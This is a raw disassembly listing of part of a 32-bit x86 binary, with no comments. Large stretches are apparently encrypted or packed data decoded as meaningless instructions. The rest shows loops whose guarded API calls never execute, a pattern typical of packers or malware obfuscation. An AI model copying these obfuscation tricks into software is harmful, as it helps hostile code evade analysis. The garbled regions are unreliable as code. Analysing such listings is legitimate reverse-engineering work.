  4030e0:	push   ebx
  4030e1:	fcmovnu st,st(5)
  4030e3:	sbb    ah,BYTE PTR [edx+0x139a42b4]
  4030e9:	and    dl,BYTE PTR [ebp+0x2751240f]
  4030ef:	in     eax,dx
  4030f0:	in     al,dx
  4030f1:	dec    ecx
  4030f2:	ret    0x5a5d
  4030f5:	sbb    al,0x90
  4030f7:	in     eax,dx
  4030f8:	pop    edx
  4030f9:	in     eax,0xd2
  4030fb:	call   0x751107bb
  403100:	mov    eax,ds:0x4ac2085e
  403105:	call   0x5f4e6efe
  40310a:	jl     0x40310a
  40310c:	es and al,0xee
  40310f:	adc    cl,BYTE PTR [ecx+0x45]
  403112:	(bad)  
  403113:	and    DWORD PTR [edx],esi
  403115:	sbb    BYTE PTR [edi-0x1e],bl
  403118:	pop    es
  403119:	mov    WORD PTR [esi-0x30805210],?
  40311f:	pop    esp
  403120:	js     0x40312a
  403122:	pusha  
  403123:	mov    al,ds:0xdcb6bcf6
  403128:	dec    ebx
  403129:	xlat   BYTE PTR ds:[ebx]
  40312a:	sbb    dh,ah
  40312c:	hlt    
  40312d:	pop    esp
  40312e:	popa   
  40312f:	mov    bp,0xe386
  403133:	inc    ecx
  403134:	leave  
  403135:	(bad)  
  403136:	jnp    0x40311d
  403138:	in     al,dx
  403139:	enter  0xfcda,0xff
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shl    DWORD PTR [edi],0x30
  40315e:	bound  eax,QWORD PTR [edx]
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x40317e
  403169:	aam    0xba
  40316b:	push   edx
  40316c:	test   DWORD PTR [ebx+0x2b45f7dc],ebp
  403172:	cmp    eax,esi
  403174:	pop    esi
  403175:	in     eax,0x17
  403177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403178:	jmp    0x91f5:0x5095630f
  40317f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403180:	sbb    al,0x5d
  403182:	data16 shl BYTE PTR [eax],1
  403185:	data16 sub BYTE PTR [eax-0x4a],al
  403189:	aaa    
  40318a:	and    dl,BYTE PTR [ecx]
  40318c:	sar    DWORD PTR [edi],0x3d
  40318f:	outs   dx,DWORD PTR ds:[esi]
  403190:	push   edi
  403191:	(bad)  
  403192:	jmp    0x40313e
  403194:	jne    0x4031f7
  403196:	shr    eax,1
  403198:	xchg   esp,eax
  403199:	test   DWORD PTR [edi+edi*4-0x716444d5],esi
  4031a0:	shr    ebp,1
  4031a2:	ja     0x4031e3
  4031a4:	adc    eax,0x5d38ae25
  4031a9:	(bad)  [ebp+0x0]
  4031ac:	dec    edi
  4031ad:	and    esi,DWORD PTR [ebp+0x5]
  4031b0:	retf   
  4031b1:	dec    eax
  4031b2:	mov    dl,0x8b
  4031b5:	ss stos BYTE PTR es:[edi],al
  4031b7:	inc    ebx
  4031b8:	cmp    DWORD PTR [ebx],ecx
  4031ba:	stos   DWORD PTR es:[edi],eax
  4031bb:	ja     0x4031e8
  4031bd:	mov    DWORD PTR [eax+0x3f8bba7f],esp
  4031c3:	mov    al,ds:0x8d213293
  4031c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031c9:	jle    0x403238
  4031cb:	xchg   edx,eax
  4031cc:	jno    0x403203
  4031ce:	and    eax,0xb3ec5b69
  4031d3:	adc    DWORD PTR [edx],esp
  4031d5:	gs xchg ebp,eax
  4031d7:	test   dh,0x9
  4031da:	sar    DWORD PTR [edi+0x41ce0562],1
  4031e0:	test   eax,0x2d7826c3
  4031e5:	(bad)  
  4031e7:	jg     0x403238
  4031e9:	test   al,0x5
  4031eb:	and    BYTE PTR [ecx],cl
  4031ed:	push   cs
  4031ee:	adc    DWORD PTR [esi+0x49929d91],ebx
  4031f4:	popf   
  4031f5:	sti    
  4031f6:	popa   
  4031f7:	out    dx,eax
  4031f8:	ins    DWORD PTR es:[edi],dx
  4031f9:	sti    
  4031fa:	xor    al,0x1a
  4031fc:	or     dl,bh
  4031fe:	cmp    edx,DWORD PTR [edx+0x2d]
  403201:	out    0xdf,eax
  403203:	mov    al,ds:0xfb1a0d3d
  403208:	enter  0x24b1,0x8e
  40320c:	addr16 push esp
  40320e:	jmp    0xb0b3e6ae
  403213:	daa    
  403214:	dec    ebx
  403215:	mov    WORD PTR [eax-0x1856a434],ss
  40321b:	mov    eax,0x9c18e013
  403220:	stos   DWORD PTR es:[edi],eax
  403221:	and    bh,dl
  403223:	jecxz  0x403295
  403225:	ja     0x4031cd
  403227:	int    0xcf
  403229:	push   edi
  40322a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40322b:	ins    DWORD PTR es:[edi],dx
  40322c:	aaa    
  40322d:	ds inc edx
  40322f:	and    BYTE PTR [eax],0x30
  403232:	mov    WORD PTR [edi+0x1d411d93],?
  403238:	cli    
  403239:	inc    esp
  40323a:	add    edx,DWORD PTR [edi]
  40323c:	icebp  
  40323d:	stc    
  40323e:	push   esi
  40323f:	xor    al,0xdc
  403241:	jecxz  0x4031e2
  403243:	pop    edx
  403244:	(bad)  
  403245:	fiadd  DWORD PTR [esi+0x6a]
  403248:	shl    BYTE PTR [edi+0x6928877e],cl
  40324e:	cmp    BYTE PTR [eax+0x7911f68],bh
  403254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403255:	jp     0x4032d3
  403257:	push   es
  403258:	inc    ebp
  403259:	stos   BYTE PTR es:[edi],al
  40325a:	enter  0x3f21,0x1f
  40325e:	loopne 0x403267
  403260:	or     bl,BYTE PTR [eax-0x33949f26]
  403266:	sbb    eax,0x258e3bea
  40326b:	cmp    ebx,DWORD PTR [ebx]
  40326d:	pusha  
  40326e:	lods   al,BYTE PTR ds:[esi]
  40326f:	call   0xbe11a35e
  403274:	jae    0x403289
  403276:	mov    ah,BYTE PTR [ebp-0x28725d3c]
  40327c:	push   esp
  40327d:	imul   esp,DWORD PTR [ebp+0x76325be3],0xbd485baa
  403287:	and    al,0xc4
  403289:	ja     0x40328a
  40328b:	sbb    al,0x97
  40328d:	adc    bh,bl
  40328f:	add    esi,DWORD PTR [edi+ebx*4]
  403292:	jle    0x40328e
  403294:	es int 0x41
  403297:	mov    edi,0x77459f17
  40329c:	ja     0x4032ee
  40329e:	jecxz  0x403277
  4032a0:	push   ds
  4032a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a2:	pop    eax
  4032a3:	mov    WORD PTR [eax],es
  4032a5:	cmp    al,0xa4
  4032a7:	sub    edx,0x61e86873
  4032ad:	pushf  
  4032ae:	inc    ebp
  4032af:	scas   eax,DWORD PTR es:[edi]
  4032b0:	adc    al,ah
  4032b2:	mov    edx,ebp
  4032b4:	lds    eax,FWORD PTR [ecx]
  4032b6:	adc    eax,0xf5a81f31
  4032bb:	dec    eax
  4032bc:	add    cl,BYTE PTR [ebx-0x54d18f9c]
  4032c2:	mov    al,0x37
  4032c4:	lods   eax,DWORD PTR ds:[esi]
  4032c5:	pop    eax
  4032c6:	hlt    
  4032c7:	inc    ebp
  4032c8:	clc    
  4032c9:	cwde   
  4032ca:	or     eax,0x726d08ed
  4032cf:	pop    edx
  4032d0:	mov    eax,0x49040f10
  4032d5:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4032d7:	xor    eax,0xbf689ca3
  4032dc:	es repz sti 
  4032df:	aaa    
  4032e0:	(bad)  
  4032e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e3:	adc    al,0x18
  4032e5:	stos   DWORD PTR es:[edi],eax
  4032e6:	(bad)  
  4032e7:	and    eax,0xce5a175c
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x4b152b76]
  403537:	jae    0x403504
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	mov    eax,ds:0xbb407b74
  403546:	add    ah,BYTE PTR [edx-0x4c3c6a52]
  40354c:	stos   DWORD PTR es:[edi],eax
  40354d:	std    
  40354e:	adc    BYTE PTR [ecx],ah
  403550:	jmp    0xe68d:0x7b92085c
  403557:	mov    cl,BYTE PTR [esp+esi*2]
  40355a:	and    BYTE PTR [edx+0x23df236c],bh
  403560:	fiadd  WORD PTR [edx+0x15]
  403563:	mov    edx,0x1e08cec4
  403568:	inc    esi
  403569:	xor    BYTE PTR [edx],dh
  40356b:	jg     0x403597
  40356d:	jmp    0x403536
  40356f:	pop    ds
  403570:	mov    ecx,0x49878f56
  403575:	cs dec esi
  403577:	dec    esp
  403579:	sub    edi,edi
  40357b:	cdq    
  40357c:	xor    DWORD PTR [eax],ecx
  40357e:	mov    bh,0x49
  403580:	aaa    
  403581:	inc    edi
  403582:	in     eax,dx
  403583:	dec    esi
  403584:	jge    0x403544
  403586:	ins    DWORD PTR es:[edi],dx
  403587:	mov    ds:0x2cec6d9e,eax
  40358c:	mov    ds:0x615acbdf,eax
  403591:	lods   eax,DWORD PTR ds:[esi]
  403592:	nop
  403593:	inc    edx
  403594:	sub    al,0xb3
  403596:	mov    WORD PTR [ecx-0x4f],ss
  403599:	outs   dx,BYTE PTR cs:[esi]
  40359b:	jecxz  0x403606
  40359d:	in     al,dx
  40359e:	sub    ecx,DWORD PTR [ebx+0x17310db4]
  4035a4:	push   0xffffff82
  4035a6:	out    dx,eax
  4035a7:	mov    al,0x20
  4035a9:	(bad)
  4035ac:	in     al,0xdc
  4035ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035af:	cli    
  4035b0:	shl    DWORD PTR [ebx],0xb4
  4035b3:	pop    ds
  4035b4:	out    0x81,al
  4035b6:	dec    edx
  4035b7:	jg     0x4035cc
  4035b9:	icebp  
  4035ba:	mov    esi,cs
  4035bc:	xor    edx,DWORD PTR ds:0xd183e2fd
  4035c2:	ins    DWORD PTR es:[edi],dx
  4035c3:	mov    esi,0x12610062
  4035c8:	push   0xdb3f3131
  4035cd:	test   eax,0xa45e67c9
  4035d2:	pusha  
  4035d3:	or     BYTE PTR [ebx-0x634db578],bl
  4035d9:	xor    eax,0x9ec77c3d
  4035de:	mov    al,0xe2
  4035e0:	adc    eax,0xf4818501
  4035e5:	outs   dx,DWORD PTR ds:[esi]
  4035e6:	dec    ebp
  4035e7:	cmp    BYTE PTR [ecx-0xf999578],0x2
  4035ee:	leave  
  4035ef:	(bad)  
  4035f1:	sub    al,BYTE PTR [ebx-0x34a475c4]
  4035f7:	push   ebp
  4035f8:	pop    ebp
  4035f9:	ins    BYTE PTR es:[edi],dx
  4035fa:	mov    dl,0x7b
  4035fc:	stc    
  4035fd:	lods   eax,DWORD PTR ds:[esi]
  4035fe:	or     esi,ecx
  403600:	inc    esi
  403601:	stc    
  403602:	push   es
  403603:	aad    0xf2
  403605:	call   0xff5a:0xe6adafd9
  40360c:	pop    esp
  40360d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40360e:	fnstcw WORD PTR [ebp+0x3b384e78]
  403614:	pop    ss
  403615:	and    ebx,DWORD PTR [edx+0x7e]
  403618:	(bad)  
  403619:	mov    cl,0xad
  40361b:	push   0x72b7cd0c
  403620:	push   ebx
  403621:	cs inc edi
  403623:	aaa    
  403624:	stc    
  403625:	pop    esp
  403626:	push   0xffffffc1
  403628:	into   
  403629:	inc    edi
  40362a:	es pusha 
  40362c:	and    eax,0x63deabad
  403631:	push   ss
  403632:	pop    ss
  403633:	hlt    
  403634:	popa   
  403635:	ror    BYTE PTR [eax],0x66
  403638:	hlt    
  403639:	sbb    cl,BYTE PTR [ecx]
  40363b:	mov    ecx,0xaf2d9370
  403640:	fisttp QWORD PTR [ecx-0x548cf78a]
  403646:	(bad)  
  403648:	test   al,0xad
  40364a:	sar    DWORD PTR [edx-0x5c27ce92],cl
  403650:	lods   al,BYTE PTR ds:[esi]
  403651:	daa    
  403652:	pushf  
  403653:	in     al,dx
  403654:	or     BYTE PTR [esi+0xf],dh
  403657:	icebp  
  403658:	ffreep st(7)
  40365a:	repz adc BYTE PTR [ebx-0x63b06399],cl
  403661:	setb   BYTE PTR [edi+0x55]
  403665:	dec    esp
  403666:	cmp    al,0xa
  403668:	in     eax,0xc0
  40366a:	clc    
  40366b:	(bad)  
  40366d:	and    bl,dh
  40366f:	sub    edx,DWORD PTR [edx+ecx*8-0x23106527]
  403676:	ds pop ebp
  403678:	mov    ds:0x944d2e82,al
  40367d:	jmp    0x40365e
  40367f:	pop    esp
  403680:	jbe    0x40369a
  403682:	mov    edx,0x367d0c89
  403687:	dec    esi
  403688:	push   ds
  403689:	add    al,0xd2
  40368b:	clc    
  40368c:	jp     0x40368a
  40368e:	mov    ebp,0xef6a0387
  403693:	cmp    DWORD PTR [esi+0x2511343e],eax
  403699:	les    esp,FWORD PTR [ecx]
  40369b:	dec    eax
  40369c:	inc    ebx
  40369d:	sbb    esi,DWORD PTR [ebx+0x1f]
  4036a0:	push   ds
  4036a1:	pushf  
  4036a2:	xor    edi,DWORD PTR [ecx-0x3d]
  4036a5:	add    BYTE PTR [esi+0x53],0xce
  4036a9:	mov    eax,0xd761155c
  4036ae:	fst    DWORD PTR [ebp-0x2ca3402]
  4036b4:	imul   esi,edx,0xfffffff9
  4036b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b8:	mov    ecx,0x3ca95f64
  4036bd:	sub    DWORD PTR [edi+0x26],ebx
  4036c0:	(bad)  
  4036c1:	dec    ebp
  4036c2:	jmp    0x40372f
  4036c4:	fs jb  0x40370f
  4036c7:	hlt    
  4036c8:	(bad)  
  4036c9:	pop    edi
  4036ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036cb:	xor    al,0xef
  4036cd:	jecxz  0x4036c8
  4036cf:	cmp    esi,DWORD PTR [edi+eax*4-0x1179ed69]
  4036d6:	inc    esp
  4036d7:	imul   ecx,DWORD PTR [edx],0x42
  4036da:	pop    ebp
  4036db:	mov    edx,0x9286c767
  4036e0:	jbe    0x4036dc
  4036e2:	sub    al,0xdc
  4036e4:	cmp    eax,0x56ea2efb
  4036e9:	sub    DWORD PTR [esp+esi*8+0x53],0xeaab4ab3
  4036f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f2:	rol    ebx,0x3b
  4036f5:	sub    dh,BYTE PTR [eax+0x2689197f]
  4036fb:	pop    ss
  4036fc:	adc    DWORD PTR [ecx-0x77],0xe4dbe4a5
  403703:	jo     0x4036ec
  403705:	xchg   edx,eax
  403706:	pop    edi
  403707:	imul   ebp,edx,0xade3ac28
  40370d:	int    0xf7
  40370f:	sub    BYTE PTR [eax+esi*4-0x4c244dc3],dh
  403716:	add    al,0xb2
  403718:	outs   dx,DWORD PTR ds:[esi]
  403719:	mov    bl,0x8b
  40371b:	cmp    ebx,DWORD PTR [eax+0x7199291]
  403721:	scas   eax,DWORD PTR es:[edi]
  403722:	or     dh,bh
  403724:	and    BYTE PTR [ebx+0x7d7db0c8],dl
  40372a:	jo     0x4036fd
  40372c:	or     edi,DWORD PTR [ecx+0x266d66f]
  403732:	jmp    0xbcda738f
  403737:	outs   dx,DWORD PTR ds:[esi]
  403738:	lock cmp eax,0x3e8000c5
  40373e:	(bad)  
  40373f:	retf   0xa1d4
  403742:	outs   dx,BYTE PTR ds:[esi]
  403743:	cdq    
  403744:	lock es mov cl,bh
  403748:	mov    esi,0xde76d775
  40374d:	mov    cs:0xfdee5561,eax
  403753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403754:	cwde   
  403755:	xchg   edi,eax
  403756:	push   ds
  403757:	mov    al,0x62
  403759:	xchg   esi,eax
  40375a:	loope  0x4037d5
  40375c:	lock jae 0x40376d
  40375f:	cmp    BYTE PTR [esi+0x44],dh
  403762:	je     0x403795
  403764:	fbstp  TBYTE PTR [ebp-0x4f1e489f]
  40376a:	inc    eax
  40376b:	outs   dx,BYTE PTR ds:[esi]
  40376c:	scas   al,BYTE PTR es:[edi]
  40376d:	retf   
  40376e:	cwde   
  40376f:	data16 (bad) 
  403772:	loope  0x4036fd
  403774:	(bad)  
  403775:	xor    bl,BYTE PTR [ecx-0x547d659c]
  40377b:	pop    edi
  40377c:	ret    0x37c4
  40377f:	cwde   
  403780:	jp     0x403759
  403782:	out    dx,al
  403783:	mov    bh,0xa7
  403785:	jae    0x403725
  403787:	cdq    
  403788:	dec    ebx
  403789:	es cmp dh,ah
  40378c:	sbb    bl,BYTE PTR [esp+eiz*4-0x673d8ca3]
  403793:	push   0xeea93c1
  403798:	push   es
  403799:	aad    0xea
  40379b:	jmp    0x403747
  40379d:	inc    ebp
  40379e:	(bad)  
  40379f:	adc    bh,BYTE PTR [ebp+0x6c]
  4037a2:	int3   
  4037a3:	sub    eax,0x85a6247d
  4037a8:	inc    edi
  4037a9:	cld    
  4037aa:	xchg   BYTE PTR [edx+0x1674f9f0],ch
  4037b0:	shr    dh,0x34
  4037b3:	pop    edi
  4037b4:	sub    eax,0xade1fed1
  4037b9:	jns    0x40380f
  4037bb:	shl    al,1
  4037bd:	dec    edx
  4037be:	cwde   
  4037bf:	push   ebx
  4037c0:	push   edi
  4037c1:	mov    DWORD PTR [edi+0x1b],ecx
  4037c4:	adc    esi,ebx
  4037c6:	jg     0x4037c3
  4037c8:	and    eax,0x9bf4605a
  4037cd:	sar    dh,1
  4037cf:	test   ah,dh
  4037d1:	sub    eax,0x1ba1c1e5
  4037d6:	xchg   edi,eax
  4037d7:	das    
  4037d8:	sub    al,0xa
  4037da:	xor    al,0x33
  4037dc:	std    
  4037dd:	cmp    al,0x84
  4037df:	or     al,0xb4
  4037e1:	push   eax
  4037e2:	sahf   
  4037e3:	inc    BYTE PTR [ecx+0x229da81]
  4037e9:	paddd  mm4,QWORD PTR [ebx-0x6]
  4037ed:	leave  
  4037ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ef:	adc    BYTE PTR [edx-0x7cffcd64],cl
  4037f5:	fcomi  st,st(2)
  4037f7:	mov    ah,BYTE PTR [edi]
  4037f9:	or     DWORD PTR [ecx-0x75],ecx
  4037fc:	rcr    BYTE PTR [esp+eiz*4+0x4d129d58],cl
  403803:	imul   ebp,DWORD PTR [esi+ebx*4],0xf
  403807:	xor    eax,ebp
  403809:	jae    0x403878
  40380b:	(bad)  
  40380c:	dec    ebp
  40380d:	test   eax,0x9926affe
  403812:	pop    ebp
  403813:	jle    0x40385a
  403815:	inc    edx
  403816:	leave  
  403817:	pushf  
  403818:	cmp    dh,BYTE PTR ds:0x6d470e64
  40381e:	mov    ch,0x4b
  403820:	aas    
  403821:	stc    
  403822:	xor    cl,BYTE PTR [esi]
  403824:	loopne 0x4037d0
  403826:	mov    eax,0x38c445c7
  40382b:	test   DWORD PTR [eax+edi*8+0x35fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	ss inc ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43372725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
